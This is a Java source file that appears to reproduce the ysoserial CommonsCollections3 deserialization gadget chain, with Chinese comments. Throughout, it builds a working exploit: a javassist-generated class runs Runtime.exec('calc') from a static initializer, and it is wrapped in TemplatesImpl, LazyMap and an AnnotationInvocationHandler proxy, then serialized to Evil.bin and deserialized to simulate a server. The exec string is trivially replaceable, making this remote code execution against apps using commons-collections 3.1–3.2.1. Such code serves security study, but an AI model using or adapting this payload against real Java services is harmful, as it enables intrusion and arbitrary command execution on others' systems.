package com.CommonsCollections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;


/**
 * Gadget chain:
 * ObjectInputStream.readObject()
 *   AnnotationInvocationHandler.readObject()
 *     Map(Proxy).entrySet()
 *       AnnotationInvocationHandler.invoke()
 *         LazyMap.get()
 *           ChainedTransformer.transform()
 *             ConstantTransformer.transform()
 *               InstantiateTransformer.transform()
 *                newInstance()
 *                 TrAXFilter#TrAXFilter()
 *                   TemplatesImpl.newTransformer()
 *                     TemplatesImpl.getTransletInstance()
 *                       TemplatesImpl.defineTransletClasses
 *                        newInstance()
 *                         Runtime.exec()
 *
 * 	Requires:
 * 		commons-collections:3.1-3.2.1
 * 	    JDK: 1.7
 *
 * 	Refer：
 * 	https://github.com/woodpecker-framework/ysoserial-for-woodpecker/blob/master/src/main/java/me/gv7/woodpecker/yso/payloads/CommonsCollections3.java
 */

public class CC3 {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass payload = pool.makeClass("EvilClass");
        payload.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
        byte[] classBytes = payload.toBytecode();
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{classBytes});
        setFieldValue(templates, "_name", "cc3");

        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})});

        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap, chain);
        Constructor<?> handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        handler_constructor.setAccessible(true);
        // 创建一个与代理对象相关联的InvocationHandler
        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class, map);
        // 创建代理对象proxy_map来代理innermap，代理对象执行的所有方法都会替换执行InvocationHandler中的invoke方法
        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, map_handler); //创建proxy对象
        Constructor<?> AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        AnnotationInvocationHandler_Constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class, proxy_map);

        //payload序列化写入文件
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("Evil.bin"));
        outputStream.writeObject(handler);
        outputStream.close();
        //服务端读取文件，反序列化，模拟网络传输
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("Evil.bin"));
        inputStream.readObject();
    }

    public static void setFieldValue(Object object, String fieldName, Object value) throws Exception{
        Field field = object.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(object, value);
    }
}
